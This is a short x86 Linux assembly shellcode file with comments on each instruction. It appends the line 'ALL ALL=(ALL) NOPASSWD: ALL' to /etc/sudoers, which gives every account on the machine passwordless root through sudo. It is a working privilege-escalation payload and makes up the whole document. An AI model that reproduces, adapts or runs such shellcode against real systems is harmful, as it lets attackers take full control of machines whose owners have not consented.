global _start

section .text

_start:

	xor edx, edx		; clear edx
	xor ecx, ecx		; clear ecx
	push edx		; terminating NULL
	push 0x7372656f 	; "sreo"
	push 0x6475732f		; "dus/"
	push 0x6374652f		; "cte/"
	mov ebx, esp		; point ebx to stack
	inc ecx			; ecx to 1
	mov ch, 0x4		; ecx to 401 O_WRONLY | O_APPEND
	push 0x5		; open()
	pop eax			
	int 0x80		; execute open
	xchg ebx, eax		; save fd in ebx
	
	jmp short setup

	
write:
	pop ecx			; pop "ALL ALL=(ALL) NOPASSWD: ALL"
	mov dl, 0x1c		; len 28
	push 0x4		; write()
	pop eax		
	int 0x80		; execute write

	push 0x1		; exit ()
	pop eax
	int 0x80
	
setup:
	call write
	db "ALL ALL=(ALL) NOPASSWD: ALL" , 0xa
	
